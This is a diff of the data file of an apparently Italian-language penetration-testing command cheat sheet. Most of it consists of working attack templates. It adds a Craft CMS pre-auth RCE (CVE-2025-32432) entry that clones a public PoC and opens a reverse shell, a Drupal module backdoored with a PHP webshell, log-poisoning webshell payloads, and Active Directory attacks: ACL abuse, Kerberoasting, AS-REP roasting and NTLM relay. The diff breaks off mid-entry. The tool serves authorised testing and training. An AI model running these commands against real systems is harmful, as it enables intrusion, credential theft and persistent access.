@@ -1662,7 +1662,7 @@ const COMMANDS = [
       "subdomains",
       "bruteforce"
     ],
-    "template": "dnsenum --enum <domain>",
+    "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
     "params": [
       {
         "key": "domain",
@@ -1673,15 +1673,21 @@ const COMMANDS = [
       {
         "key": "ip",
         "label": "Nameserver",
+        "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "subnet",
+        "label": "Subnet",
+        "placeholder": "10.10.10.0/24"
       }
     ],
     "variants": [
       {
         "id": "default",
         "label": "dnsenum",
-        "template": "dnsenum --enum <domain>",
-        "description": "Bruteforce + zone transfer + lookup in un tool solo. Veloce da lanciare."
+        "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
+        "description": "Bruteforce + AXFR + whois in un tool solo. È `-f` ad attivare il bruteforce: senza wordlist dnsenum si limita a enumerare i record. `--dnsserver` manda le query al DNS indicato, obbligatorio sui domini interni che il resolver locale non risolve."
       },
       {
         "id": "puredns",
@@ -3527,9 +3533,9 @@ const COMMANDS = [
   {
     "id": "mssql-xpcmdshell",
     "name": "MSSQL — xp_cmdshell RCE",
-    "category": "service-enum",
-    "subcategory": "mssql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MSSQL (1433)",
     "description": "`xp_cmdshell` esegue comandi del sistema operativo con i privilegi dell'account di servizio SQL, che spesso è un account di dominio. È disabilitato di default e va riattivato con `sp_configure`, operazione che richiede il ruolo sysadmin. L'output del comando torna nella griglia dei risultati.",
     "note": "# Se la riconfigurazione fallisce\nIl messaggio `SQL Server blocked access to procedure 'sys.xp_cmdshell'` indica che l'utente non è sysadmin. In quel caso la via è l'impersonation di un login sysadmin, oppure la cattura del NetNTLMv2 con `xp_dirtree` verso una share controllata.",
     "platform": "cross-platform",
@@ -3556,9 +3562,9 @@ const COMMANDS = [
   {
     "id": "mssql-impersonate",
     "name": "MSSQL — impersonate sa",
-    "category": "service-enum",
-    "subcategory": "mssql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MSSQL (1433)",
     "description": "La scalata di privilegi in MSSQL non richiede per forza il ruolo sysadmin: se un login di basso privilegio ha il permesso `IMPERSONATE` su un altro, può assumerne l'identità con `EXECUTE AS LOGIN`. Impersonando `sa` o un qualsiasi sysadmin si arriva comunque a xp_cmdshell. I login impersonabili si individuano con la query dedicata nella scheda dei ruoli.",
     "note": "# Ritorno all'identità originale\nDopo `EXECUTE AS LOGIN = 'sa'` il contesto resta cambiato per tutta la sessione: `REVERT` riporta al login di partenza. `SELECT SYSTEM_USER` conferma in ogni momento chi si è.",
     "platform": "cross-platform",
@@ -3584,9 +3590,9 @@ const COMMANDS = [
   {
     "id": "mssql-readfile",
     "name": "MSSQL — leggi file (OPENROWSET)",
-    "category": "service-enum",
-    "subcategory": "mssql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MSSQL (1433)",
     "description": "Legge un file dal filesystem del server SQL come singolo blob di testo. Serve il permesso `ADMINISTER BULK OPERATIONS` o il ruolo `bulkadmin` (i sysadmin li hanno). Comodo per `web.config`, config, chiavi, flag.",
     "platform": "cross-platform",
     "requires": [
@@ -4524,9 +4530,9 @@ const COMMANDS = [
   {
     "id": "mssql-xpdirtree",
     "name": "MSSQL — xp_dirtree NTLM capture",
-    "category": "service-enum",
-    "subcategory": "mssql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MSSQL (1433)",
     "description": "Forza il servizio SQL a raggiungere una share UNC controllata dall'attaccante per catturare il NetNTLMv2 con Responder, da craccare o rilanciare in relay. Funziona anche senza privilegi elevati.",
     "platform": "cross-platform",
     "requires": [
@@ -4553,9 +4559,9 @@ const COMMANDS = [
   {
     "id": "mssql-linked",
     "name": "MSSQL — linked servers",
-    "category": "service-enum",
-    "subcategory": "mssql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MSSQL (1433)",
     "description": "Enumera i server collegati: spesso permettono di saltare su altri host SQL (EXECUTE … AT), a volte con privilegi maggiori.",
     "platform": "cross-platform",
     "requires": [
@@ -4664,9 +4670,9 @@ const COMMANDS = [
   {
     "id": "mysql-queries",
     "name": "MySQL — enum & file read",
-    "category": "service-enum",
-    "subcategory": "mysql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MySQL (3306)",
     "description": "Una volta dentro: elenca i database, leggi le tabelle utenti e, con privilegio `FILE`, leggi file dal disco (`LOAD_FILE`).",
     "platform": "cross-platform",
     "requires": [
@@ -4712,9 +4718,9 @@ const COMMANDS = [
   {
     "id": "mysql-privcheck",
     "name": "MySQL — check RCE",
-    "category": "service-enum",
-    "subcategory": "mysql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MySQL (3306)",
     "description": "Prima di tentare la RCE serve verificarne la fattibilità: MySQL non ha un `xp_cmdshell` pronto, quindi occorrono il privilegio `FILE` e un `secure_file_priv` non bloccato.\n- `secure_file_priv` = `''` (vuoto) consente la scrittura ovunque · `/path` la limita a quella directory · `NULL` la disabilita, e la RCE via file cade\n- il privilegio `FILE` deve comparire nei grant\n- `plugin_dir` indica dove va collocata la libreria per la via UDF",
     "platform": "cross-platform",
     "requires": [
@@ -4761,9 +4767,9 @@ const COMMANDS = [
   {
     "id": "mysql-oscmd",
     "name": "MySQL — RCE (OUTFILE / UDF)",
-    "category": "service-enum",
-    "subcategory": "mysql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MySQL (3306)",
     "description": "Esecuzione comandi dal database MySQL. Entrambe le vie richiedono il privilegio `FILE` e un `secure_file_priv` permissivo, come descritto in `MySQL — check RCE`.\n- webshell: scrittura di un `.php` nel webroot con `INTO OUTFILE`, che viene poi eseguito via HTTP\n- UDF: caricamento di `lib_mysqludf_sys.so` nel `plugin_dir` e creazione di `sys_eval` per lanciare comandi come l'utente mysqld",
     "platform": "cross-platform",
     "requires": [
@@ -4875,9 +4881,9 @@ const COMMANDS = [
   {
     "id": "rtsp-cameradar",
     "name": "RTSP — cameradar (auto)",
-    "category": "service-enum",
-    "subcategory": "rtsp",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "RTSP (554/8554)",
     "description": "Tool automatico per telecamere RTSP: scopre gli host, indovina i path di stream e fa il brute delle credenziali di default. La via più rapida per accedere a una camera.\n- `--targets` = target (IP, CIDR, range o hostname)\n- `--ports` = porte custom (default 554)\n- `--net=host` = flag Docker, così il container raggiunge la rete del target",
     "platform": "linux",
     "requires": [
@@ -4911,9 +4917,9 @@ const COMMANDS = [
   {
     "id": "rtsp-stream",
     "name": "RTSP — apri/cattura stream",
-    "category": "service-enum",
-    "subcategory": "rtsp",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "RTSP (554/8554)",
     "description": "Con un path valido e (se servono) le credenziali, apri o cattura il flusso video della camera. Le virgolette proteggono `?` e `&` nell'URL.",
     "platform": "cross-platform",
     "requires": [
@@ -5606,7 +5612,7 @@ const COMMANDS = [
       {
         "id": "backdoor",
         "label": "modulo backdoor",
-        "template": "wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz\ntar xf captcha-8.x-1.2.tar.gz\nprintf '<?php system($_GET[\"<hash>\"]); ?>' > captcha/shell.php\nprintf '<IfModule mod_rewrite.c>\\nRewriteEngine On\\nRewriteBase /\\n</IfModule>' > captcha/.htaccess\ntar czf captcha.tar.gz captcha/\n# Manage > Extend > + Install new module: upload di captcha.tar.gz, poi:\ncurl -s \"http://<ip>/modules/captcha/shell.php?<hash>=id\"",
+        "template": "# scarica un modulo legittimo da drupal.org\nwget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz\n\n# lo scompatta\ntar xf captcha-8.x-1.2.tar.gz\n\n# aggiunge la webshell PHP dentro il modulo\nprintf '<?php system($_GET[\"<hash>\"]); ?>' > captcha/shell.php\n\n# aggiunge un .htaccess che sblocca l'accesso diretto a /modules\nprintf '<IfModule mod_rewrite.c>\\nRewriteEngine On\\nRewriteBase /\\n</IfModule>' > captcha/.htaccess\n\n# ricompatta il modulo, ora con la backdoor dentro\ntar czf captcha.tar.gz captcha/\n\n# dopo l'upload da Manage > Extend > Install new module, esegue i comandi\ncurl -s \"http://<ip>/modules/captcha/shell.php?<hash>=id\"",
         "description": "Modulo legittimo trasformato in backdoor. Nell'archivio del modulo Captcha vengono aggiunti una web shell PHP e un `.htaccess` che sblocca l'accesso diretto a `/modules`; dopo l'installazione dal pannello la shell risponde su `/modules/captcha/shell.php`. Anche qui servono consenso e rimozione degli artefatti."
       },
       {
@@ -5621,6 +5627,99 @@ const COMMANDS = [
       {
         "label": "Drupal — SA-CORE-2018-002",
         "url": "https://www.drupal.org/sa-core-2018-002"
+      }
+    ]
+  },
+  {
+    "id": "craftcms-rce",
+    "name": "Craft CMS — pre-auth RCE (CVE-2025-32432)",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "CMS",
+    "description": "L'endpoint `assets/generate-transform` risponde senza credenziali e deserializza parte del JSON che riceve, quindi è l'attaccante a scegliere quali classi istanziare. La catena `FieldLayoutBehavior → yii\\rbac\\PhpManager` fa puntare `itemFile` al file di sessione PHP, dove Craft scrive i dati di richiesta che non riconosce: si avvelena la sessione con codice PHP, il gadget la include e il codice gira come utente del web server, di norma www-data.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "craftcms",
+      "cms",
+      "cve-2025-32432",
+      "deserialization",
+      "yii",
+      "rce"
+    ],
+    "template": "# scarica il PoC dal repo\ngit clone https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce\n\n# entra nella directory appena creata\ncd CVE-2025-32432-craftcms-rce\n\n# esegue id sul target: sessione, token CSRF e asset ID li trova lo script\npython3 cve-2025-32432.py -u http://<ip> -c id",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "craft.inlanefreight.local"
+      },
+      {
+        "key": "cmd",
+        "label": "Comando",
+        "placeholder": "cat /etc/passwd"
+      },
+      {
+        "key": "asset",
+        "label": "Asset ID",
+        "placeholder": "1"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.3"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "4444"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "comando singolo",
+        "template": "# scarica il PoC dal repo\ngit clone https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce\n\n# entra nella directory appena creata\ncd CVE-2025-32432-craftcms-rce\n\n# esegue id sul target: sessione, token CSRF e asset ID li trova lo script\npython3 cve-2025-32432.py -u http://<ip> -c id",
+        "description": "Lo script ricava da sé cookie di sessione, token CSRF e un asset ID valido, poi esegue il comando e stampa l'output. Parti da `id`: dice con quali privilegi gira il web server."
+      },
+      {
+        "id": "asset-noto",
+        "label": "asset ID noto",
+        "template": "python3 cve-2025-32432.py -u http://<ip> -c '<cmd>' -a <asset>",
+        "description": "Con `-a` si salta il probing, che altrimenti prova gli asset ID fino a 100 (`--amax` cambia il limite) lasciando una scia di errori 500 nei log. L'ID si trova sfogliando il sito o da un primo run riuscito."
+      },
+      {
+        "id": "shell",
+        "label": "reverse shell",
+        "template": "# listener in ascolto sulla macchina attaccante\nnc -lvnp <lport>\n\n# lancia l'exploit, che apre la shell verso il listener\npython3 cve-2025-32432.py -u http://<ip> --shell <lhost> <lport> -a <asset>",
+        "description": "Listener prima, exploit dopo. Ottenuta la shell, il file `.env` nella root del progetto Craft contiene `CRAFT_SECURITY_KEY` e le credenziali del database, spesso riutilizzate altrove."
+      },
+      {
+        "id": "debug",
+        "label": "debug della catena",
+        "template": "python3 cve-2025-32432.py -u http://<ip> -c '<cmd>' --debug",
+        "description": "Stampa richieste e risposte di ogni fase. Serve quando l'exploit arriva in fondo senza eseguire nulla, per vedere dove si rompe la catena."
+      }
+    ],
+    "note": "# Versioni vulnerabili\n- **Craft 3.x** · affette `3.0.0-RC1 → 3.9.14` · corretta in `3.9.15`\n- **Craft 4.x** · affette `4.0.0-RC1 → 4.14.14` · corretta in `4.14.15`\n- **Craft 5.x** · affette `5.0.0-RC1 → 5.6.16` · corretta in `5.6.17`\n\nCraft non espone la versione in chiaro: la si deduce da `/admin`, dagli asset versionati e dagli header di risposta.\n# Perché i PoC pubblici non funzionano\n- **cookie**: Craft emette `CraftSessionId`, non `PHPSESSID`\n- **asset ID**: non esiste uno status code \"buono\". Un ID valido si riconosce perché la risposta diverge da quella di un ID inesistente\n- **token CSRF**: va preso da `index.php?p=actions/users/session-info` e abbinato alla sessione in corso, altrimenti il server risponde 400\n- **URL-encoding**: `requests` percent-encodifica la query string, così il payload arriva nel file di sessione come `%3C%3Fphp` e PHP non esegue nulla. Per questo la richiesta parte su socket raw\n# Prerequisiti e cleanup\nSul target serve `session.save_handler = files`: con le sessioni su Redis o database la catena non trova un file da includere. A fine test va rimosso il file di sessione avvelenato, che resta su disco con il payload PHP dentro.",
+    "refs": [
+      {
+        "label": "PoC + writeup (l0lsuit)",
+        "url": "https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce"
+      },
+      {
+        "label": "Craft CMS — GHSA-f3gw-9ww9-jmc3",
+        "url": "https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3"
+      },
+      {
+        "label": "SensePost — analisi della campagna in the wild",
+        "url": "https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/"
       }
     ]
   },
@@ -5947,7 +6046,7 @@ const COMMANDS = [
       "log-poisoning",
       "rce"
     ],
-    "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/\n# poi includi il log via LFI per eseguire:\nhttp://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
+    "template": "# avvelena il log del web server scrivendo il payload nello User-Agent\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/\n\n# include il log via LFI: il PHP dentro viene eseguito\nhttp://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
     "variants": [{"id": "default", "label": "1. Inietta nel log", "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/", "description": "Il payload PHP entra nel log di access come valore dello User-Agent. La richiesta serve solo a scrivere nel log, quindi la risposta HTTP è irrilevante."}, {"id": "trigger", "label": "2. Includi ed esegui", "template": "curl \"http://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id\"", "description": "Includendo il log via LFI, il PHP iniettato viene eseguito e il parametro `cmd` ne controlla il comando. Il percorso del log cambia fra Apache e Nginx e deve essere leggibile dal processo web."}],
     "params": [
       {
@@ -6906,7 +7005,7 @@ const COMMANDS = [
       {
         "id": "full",
         "label": "Upgrade completo",
-        "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm",
+        "template": "# spawn di una PTY dentro la shell corrente\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n# sospendi con Ctrl+Z, passa il terminale in raw e riprendi la shell\nstty raw -echo; fg\n\n# dichiara il tipo di terminale, così clear e gli editor funzionano\nexport TERM=xterm",
         "description": "Dopo lo spawn: `Ctrl+Z`, poi `stty raw -echo; fg`, infine `export TERM=xterm` per una TTY piena."
       },
       {
@@ -7180,7 +7279,7 @@ const COMMANDS = [
   },
   {
     "id": "secretsdump",
-    "name": "secretsdump.py — dump remoto",
+    "name": "impacket-secretsdump — dump remoto",
     "category": "post-exp",
     "subcategory": "cred-harvesting",
     "group": "Windows",
@@ -7663,7 +7762,7 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "file-transfer",
     "group": "SMB",
-    "description": "Server SMB dall’attacker: utile quando il target Windows non scarica via HTTP. `-smb2support` per i Windows recenti.",
+    "description": "Due direzioni: server SMB dall’attacker (il target Windows scarica), oppure upload diretto su una share con credenziali via `nxc --put-file` o `smbclient put`. `-smb2support` per i Windows recenti.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -7682,6 +7781,39 @@ const COMMANDS = [
         "key": "lhost",
         "label": "Tuo host",
         "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "share",
+        "label": "Share",
+        "placeholder": "C$"
+      },
+      {
+        "key": "lfile",
+        "label": "File locale",
+        "placeholder": "shell.exe"
+      },
+      {
+        "key": "rfile",
+        "label": "Path remoto",
+        "placeholder": "\\\\Windows\\\\Temp\\\\shell.exe"
       }
     ],
     "variants": [
@@ -7696,6 +7828,18 @@ const COMMANDS = [
         "label": "Copia (Windows)",
         "template": "copy \\\\<lhost>\\share\\file.exe C:\\Temp\\",
         "description": "Dal target Windows: copia dalla share dell'attaccante."
+      },
+      {
+        "id": "nxc-upload",
+        "label": "Upload (nxc)",
+        "template": "nxc smb <ip> -u '<user>' -p '<password>' --put-file <lfile> <rfile> --share <share>",
+        "description": "Carica `<lfile>` sulla share remota (`--share`, default `C$`). Per scaricare: `--get-file <rfile> <lfile>`. Serve una credenziale e permesso di scrittura sulla share."
+      },
+      {
+        "id": "smbclient-upload",
+        "label": "Upload (smbclient)",
+        "template": "smbclient //<ip>/<share> -U '<user>%<password>' -c 'put <lfile> <rfile>'",
+        "description": "Upload one-shot con `-c` senza entrare nella shell. Dentro la sessione interattiva: `put <lfile>` per caricare, `get` per scaricare."
       }
     ]
   },
@@ -7716,7 +7860,7 @@ const COMMANDS = [
       "nc",
       "base64"
     ],
-    "template": "nc -lvnp 9999 > file   # receiver\nnc <ip> 9999 < file    # sender",
+    "template": "# sul ricevente: resta in ascolto e scrive quello che arriva su file\nnc -lvnp 9999 > file\n\n# sul mittente: invia il file al ricevente\nnc <ip> 9999 < file",
     "params": [
       {
         "key": "ip",
@@ -7734,13 +7878,13 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "netcat",
-        "template": "nc -lvnp 9999 > file   # receiver\nnc <ip> 9999 < file   # sender",
+        "template": "# sul ricevente: resta in ascolto e scrive quello che arriva su file\nnc -lvnp 9999 > file\n\n# sul mittente: invia il file al ricevente\nnc <ip> 9999 < file",
         "description": "Receiver in ascolto, sender invia il file."
       },
       {
         "id": "base64",
         "label": "base64",
-        "template": "base64 -w0 file   # encode (sorgente)\necho \"<b64>\" | base64 -d > file   # decode (destinazione)",
+        "template": "# sulla sorgente: codifica il file in una riga sola da copiare\nbase64 -w0 file\n\n# sulla destinazione: decodifica la riga e ricostruisce il file\necho \"<b64>\" | base64 -d > file",
         "description": "Per file piccoli; su Windows `certutil -decode encoded.txt file`."
       }
     ]
@@ -8531,7 +8675,7 @@ const COMMANDS = [
         "id": "printnightmare",
         "label": "PrintNightmare",
         "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\shell.dll'",
-        "description": "`CVE-2021-1675` e `CVE-2021-34527`. Lo spooler si verifica con `rpcdump.py @<ip> | egrep \"MS-RPRN|MS-PAR\"`. La DLL va ospitata su una share SMB."
+        "description": "`CVE-2021-1675` e `CVE-2021-34527`. Lo spooler si verifica con `impacket-rpcdump @<ip> | egrep \"MS-RPRN|MS-PAR\"`. La DLL va ospitata su una share SMB."
       }
     ]
   },
@@ -9177,7 +9321,7 @@ const COMMANDS = [
       "deleted-objects",
       "tombstone"
     ],
-    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable --include-del",
+    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable",
     "params": [
       {
         "key": "ip",
@@ -9213,13 +9357,19 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Linux (bloodyAD)",
-        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable --include-del\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set restore <target>",
+        "template": "# oggetti su cui hai permesso di scrittura: i cancellati ci sono di default (--exclude-del per ometterli)\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable\n\n# ripristina dal cestino di AD l'oggetto scelto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set restore <target>",
         "description": "Individua gli oggetti eliminati e ripristina il target, recuperandone tutti i gruppi e i permessi."
+      },
+      {
+        "id": "search",
+        "label": "Enum cestino (get search)",
+        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get search --filter '(isDeleted=TRUE)' --attr name,objectSid,memberOf,msDS-LastKnownRDN,lastKnownParent -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065",
+        "description": "Elenca il cestino a prescindere dai diritti, mentre `get writable` mostra solo ciò su cui puoi scrivere. `2064` rende visibili gli oggetti cancellati, `2065` riattiva i link disattivati (senza, `memberOf` torna vuoto). `name` è mangled (`old_svc\\0ADEL:<guid>`): il nome vero sta in `msDS-LastKnownRDN`, e `lastKnownParent` è il container che serve a `set restore`."
       },
       {
         "id": "windows",
         "label": "Windows (AD module)",
-        "template": "Get-ADObject -Filter {isDeleted -eq $true -and objectClass -eq 'user'} -IncludeDeletedObjects -Properties *\nGet-ADObject -Filter {Name -like '<target>'} -IncludeDeletedObjects | Restore-ADObject",
+        "template": "# elenca gli utenti cancellati ancora presenti nel cestino\nGet-ADObject -Filter {isDeleted -eq $true -and objectClass -eq 'user'} -IncludeDeletedObjects -Properties *\n\n# ripristina l'oggetto che corrisponde al nome cercato\nGet-ADObject -Filter {Name -like '<target>'} -IncludeDeletedObjects | Restore-ADObject",
         "description": "Enum e restore da Windows. Serve il diritto `DS-Reanimate-Tombstones`."
       }
     ],
@@ -9394,33 +9544,35 @@ const COMMANDS = [
       "ntlmrelayx",
       "relay"
     ],
-    "template": "ntlmrelayx.py -tf targets.txt -smb2support -i",
+    "template": "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
     "params": [],
     "variants": [
       {
         "id": "default",
         "label": "Shell interattiva",
-        "template": "ntlmrelayx.py -tf targets.txt -smb2support -i",
+        "template": "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
         "description": "Apre una shell SMB sul target relayato (`nc 127.0.0.1 11000`)."
       },
       {
         "id": "exec",
         "label": "Esegui comando",
-        "template": "ntlmrelayx.py -tf targets.txt -smb2support -c \"powershell -enc <b64>\"",
+        "template": "impacket-ntlmrelayx -tf targets.txt -smb2support -c \"powershell -enc <b64>\"",
         "description": "Esegue un comando sul target relayato."
       }
     ]
   },
   {
     "id": "getnpusers",
-    "name": "GetNPUsers.py — AS-REP roast",
+    "name": "impacket-GetNPUsers — AS-REP roast",
     "category": "active-directory",
     "subcategory": "initial-access",
     "group": "AS-REP Roasting",
     "description": "Preleva gli AS-REP degli account che hanno la pre-autenticazione Kerberos disabilitata, un'opzione lasciata spesso su account di servizio legacy. L'hash risultante si cracca offline con hashcat in mode 18200. Senza credenziali serve una lista di username, che si ottiene con kerbrute; con credenziali valide GetNPUsers li enumera da solo.",
     "platform": "linux",
     "requires": [
-      "no-creds"
+      "no-creds",
+      "password",
+      "hash"
     ],
     "protocols": [
       "kerberos"
@@ -9429,7 +9581,7 @@ const COMMANDS = [
       "impacket",
       "asrep"
     ],
-    "template": "GetNPUsers.py <domain>/ -usersfile <userlist> -dc-ip <ip> -no-pass -outputfile asrep.txt",
+    "template": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -dc-ip <ip> -no-pass -outputfile asrep.txt",
     "params": [
       {
         "key": "domain",
@@ -9447,12 +9599,50 @@ const COMMANDS = [
         "label": "DC IP",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "hash",
+        "label": "Hash NTLM",
+        "ctx": "hash",
+        "placeholder": "aad3b435..."
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Senza credenziali",
+        "template": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -dc-ip <ip> -no-pass -outputfile asrep.txt",
+        "description": "Serve solo una lista di username (da `kerbrute userenum`): chiede l’AS-REP di ognuno, risponde con l’hash chi ha la pre-auth disabilitata."
+      },
+      {
+        "id": "creds",
+        "label": "Con password",
+        "template": "impacket-GetNPUsers <domain>/<user>:<password> -dc-ip <ip> -request -outputfile asrep.txt",
+        "description": "`-request` trova da solo via LDAP gli account con `DONT_REQ_PREAUTH` e ne preleva l’hash: niente userlist."
+      },
+      {
+        "id": "hash",
+        "label": "NTLM hash",
+        "template": "impacket-GetNPUsers <domain>/<user> -hashes :<hash> -dc-ip <ip> -request -outputfile asrep.txt",
+        "description": "Stesso enum autenticato in Pass-the-Hash."
       }
     ]
   },
   {
     "id": "getuserspns",
-    "name": "GetUserSPNs.py — Kerberoast",
+    "name": "impacket-GetUserSPNs — Kerberoast",
     "category": "active-directory",
     "subcategory": "initial-access",
     "group": "Kerberoasting",
@@ -9468,7 +9658,7 @@ const COMMANDS = [
       "impacket",
       "kerberoast"
     ],
-    "template": "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerb.txt",
+    "template": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerb.txt",
     "params": [
       {
         "key": "domain",
@@ -9502,7 +9692,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ACL Abuse",
-    "description": "Sfrutta i diritti ACL trovati in BloodHound. `ForceChangePassword`/`GenericAll` → reset password; `GenericWrite` → Shadow Credentials (no reset); `AddMember` → aggiunta a gruppo.",
+    "description": "Anello centrale della catena **Foothold → BloodHound → ACL → DA**: ogni arco che BloodHound disegna sul path diventa qui un comando.\n- `ForceChangePassword` / `GenericAll` → reset della password del target\n- `GenericWrite` → Shadow Credentials, senza toccare la password\n- `AddMember` → ti aggiungi al gruppo privilegiato",
     "platform": "linux",
     "requires": [
       "password"
@@ -9628,14 +9818,14 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "bloodyAD",
-        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>\n\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add genericAll <target> <user>",
+        "template": "# ti assegna la proprietà dell'oggetto target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>\n\n# da proprietario, ti concedi GenericAll sull'oggetto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add genericAll <target> <user>",
         "description": "Assegna la proprietà del target all'account controllato, che poi si concede `GenericAll`. Da lì l'abuso procede come un normale ACL, con reset password o aggiunta a gruppo."
       },
       {
         "id": "impacket",
         "label": "owneredit + dacledit",
-        "template": "owneredit.py -action write -new-owner <user> -target <target> '<domain>/<user>:<password>'\ndacledit.py -action write -rights FullControl -principal <user> -target <target> '<domain>/<user>:<password>'",
-        "description": "Cambia owner con `owneredit.py`, poi assegna FullControl con `dacledit.py`."
+        "template": "# riscrive il proprietario dell'oggetto target\nimpacket-owneredit -action write -new-owner <user> -target <target> '<domain>/<user>:<password>'\n\n# da proprietario, scrive una ACE FullControl a tuo favore\nimpacket-dacledit -action write -rights FullControl -principal <user> -target <target> '<domain>/<user>:<password>'",
+        "description": "Cambia owner con `impacket-owneredit`, poi assegna FullControl con `impacket-dacledit`."
       }
     ],
     "refs": [
@@ -9695,6 +9885,16 @@ const COMMANDS = [
         "key": "target",
         "label": "Utente target",
         "placeholder": "svc_user"
+      },
+      {
+        "key": "dc_fqdn",
+        "label": "DC FQDN (per -k)",
+        "placeholder": "dc01.corp.local"
+      },
+      {
+        "key": "kirbi_b64",
+        "label": "Kirbi base64 (opz.)",
+        "placeholder": "doIF..."
       }
     ],
     "variants": [
@@ -9707,8 +9907,14 @@ const COMMANDS = [
       {
         "id": "manual",
         "label": "Manuale (bloodyAD)",
-        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName -v 'fake/spn'\nimpacket-GetUserSPNs <domain>/<user>:'<password>' -dc-ip <ip> -request-user <target>\n# cleanup: rimuovi lo SPN\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName",
+        "template": "# scrive uno SPN finto sull'account target, rendendolo kerberoastable\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName -v 'fake/spn'\n\n# richiede il TGS e salva l'hash da crackare offline\nimpacket-GetUserSPNs <domain>/<user>:'<password>' -dc-ip <ip> -request-user <target>\n\n# cleanup: rimuove lo SPN appena aggiunto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName",
         "description": "L'SPN fittizio va aggiunto, il TGS richiesto e l'SPN poi rimosso. Il crack avviene con hashcat in mode `-m 13100`."
+      },
+      {
+        "id": "kerberos",
+        "label": "Kerberos (-k / ccache)",
